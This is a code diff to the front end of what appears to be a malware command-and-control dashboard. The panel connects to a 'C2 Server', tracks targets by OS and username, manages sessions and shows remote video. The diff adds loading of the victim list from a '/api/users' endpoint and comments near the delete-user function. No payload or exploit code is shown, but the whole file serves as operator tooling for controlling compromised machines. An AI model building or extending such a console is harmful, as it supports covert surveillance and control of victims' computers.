@@ -91,8 +91,6 @@
 
         const ws = new WebSocket(wsUrl);
         let users = {};
-
-        // Store sessions by ID to avoid conflicts
         let sessions = {};
         const remoteVideo = document.getElementById('remoteVideo');
 
@@ -100,6 +98,8 @@
             console.log("Admin connected to C2");
             ws.send(JSON.stringify({ type: 'register_admin' }));
             addLog("Connected to C2 Server", "blue");
+            // Fetch initial user list from DB
+            fetchUsersFromDB();
         };
 
         ws.onmessage = (event) => {
@@ -125,7 +125,7 @@
                         users[data.id].sessionActive = false;
                     }
                     renderUsers();
-                } 
+                }
                 else if (data.type === 'refresh_users') {
                     // Refresh logic handled by real-time updates
                 }
@@ -182,6 +182,31 @@
                 console.error("Error parsing message:", e);
             }
         };
+
+        // Fetch users from the DB API endpoint
+        async function fetchUsersFromDB() {
+            try {
+                const response = await fetch('/api/users');
+                const dbUsers = await response.json();
+                
+                // Clear existing users to avoid duplicates
+                users = {};
+                
+                dbUsers.forEach(user => {
+                    // Convert DB format to UI format
+                    users[user.id] = {
+                        status: user.status === 'Online' ? 'Online' : 'Offline',
+                        logs: [],
+                        info: { os: user.os, user: user.user },
+                        lastSeen: user.last_seen * 1000, // Convert to milliseconds
+                        sessionActive: false
+                    };
+                });
+                renderUsers();
+            } catch (error) {
+                console.error("Failed to fetch users from DB", error);
+            }
+        }
 
         function getSession(targetId) {
             if (!sessions[targetId]) {
@@ -388,9 +413,13 @@
 
         function deleteUser(id) {
             if (confirm(`Are you sure you want to delete ${id}?`)) {
+                // Remove from local memory
                 delete users[id];
                 renderUsers();
                 addLog(`[DELETE] User ${id} removed from dashboard`, 'red');
+                
+                // Optionally remove from DB here if you have an API endpoint for it
+                // fetch(`/api/users/${id}`, { method: 'DELETE' });
             }
         }
 
